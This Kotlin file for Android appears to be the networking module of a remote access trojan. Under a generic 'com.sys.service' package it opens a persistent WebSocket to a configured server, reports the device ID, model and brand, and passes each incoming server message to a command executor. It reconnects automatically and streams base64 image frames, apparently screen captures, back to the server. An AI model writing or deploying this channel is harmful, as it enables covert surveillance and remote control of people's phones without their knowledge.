package com.sys.service

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object Net {
    private var ws: WebSocket? = null
    @Volatile var online = false
    private var tries = 0
    private val h = Handler(Looper.getMainLooper())

    fun start(ctx: Context) {
        if (ws != null) return
        val id = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "dev"
        val req = Request.Builder().url(Cfg.HOST + "?id=" + id + "&token=" + Cfg.TOKEN).build()
        val cli = OkHttpClient.Builder()
            .pingInterval(20, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()
        ws = cli.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(w: WebSocket, r: Response) {
                online = true
                tries = 0
                send(mapOf("c" to "hello", "model" to android.os.Build.MODEL,
                    "brand" to android.os.Build.BRAND, "sdk" to android.os.Build.VERSION.SDK_INT))
            }
            override fun onFailure(w: WebSocket, t: Throwable, r: Response?) { drop(ctx) }
            override fun onClosed(w: WebSocket, code: Int, reason: String) { drop(ctx) }
            override fun onMessage(w: WebSocket, text: String) {
                runCatching { Exec.handle(ctx, JSONObject(text)) }
            }
        })
    }

    private fun drop(ctx: Context) {
        online = false
        ws = null
        tries++
        h.postDelayed({ start(ctx) }, minOf(30000L, 1500L * tries))
    }

    fun send(m: Map<String, Any?>) {
        if (!online) return
        runCatching { ws?.send(JSONObject(m).toString()) }
    }

    fun frame(b64: String, w: Int, hh: Int) = send(mapOf("c" to "f", "d" to b64, "w" to w, "h" to hh))
}
